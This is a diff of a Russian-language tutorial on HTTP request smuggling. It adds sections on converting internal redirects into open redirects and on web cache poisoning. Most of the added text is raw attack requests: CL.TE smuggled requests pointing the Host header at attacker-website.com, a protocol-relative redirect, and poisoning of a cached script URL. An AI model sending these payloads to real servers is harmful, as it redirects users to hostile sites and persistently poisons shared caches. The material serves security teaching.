@@ -424,11 +424,86 @@ GET / HTTP/1.1
 User-Agent: <script>alert(1)</script>
 Foo: X
 ```
-Запрос следующего пользователя будет добавлен к контрафактному запросу, и он получит отраженную полезную нагрузку XSS в ответе.
 
 ## Использование HTTP Request Smuggling для превращения внутреннего перенаправления в открытое перенаправление
+> Многие приложения выполняют внутренние перенаправления с одного URL на другой и помещают имя хоста из заголовка Host запроса в URL перенаправления. Примером этого является поведение по умолчанию веб-серверов Apache и IIS, где запрос на папку без завершающего слеша получает перенаправление в ту же папку, включая завершающий слеш.
+
+```python
+GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+Такое поведение обычно считается безвредным, но его можно использовать в атаке с подменой запроса для перенаправления других пользователей на внешний домен.
+```python
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+```
+Подменой запрос вызовет перенаправление на веб-сайт злоумышленника, что повлияет на следующий запрос пользователя, который обрабатывается внутренним сервером.
+
+```python
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /scripts/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+
+* **Превращение корневых перенаправлений в открытые перенаправления**
+
+```python
+GET /example HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: /example/
+```
+Это потенциально все еще может быть использовано для открытого перенаправления, если сервер позволяет использовать URL-адрес, относящийся к протоколу, в пути:
+```
+GET //attacker-website.com/example HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: //attacker-website.com/example/
+```
 
 ## Использование HTTP Request Smuggling для выполнения атаки отравления веб-кэша
+
+> Если какая-либо часть инфраструктуры front-end выполняет кэширование контента (обычно по соображениям производительности), то можно отравить кэш ответом на перенаправление за пределы сайта. Это сделает атаку постоянной, затрагивая любого пользователя, который впоследствии запросит затронутый URL.
+
+```python
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 59
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: XGET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+```
+Запрос достигает внутреннего сервера, который отвечает, как и прежде, перенаправлением за пределы сайта. Фронтальный сервер кэширует этот ответ в соответствии с тем, что он считает URL-адресом во втором запросе, который является /static/include.js
+```
+GET /static/include.js HTTP/1.1
+Host: vulnerable-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://attacker-website.com/home/
+```
+С этого момента, когда другие пользователи запрашивают этот URL-адрес, они получают перенаправление.
 
 ## Использование HTTP Request Smuggling для выполнения обмана веб-кэша
 
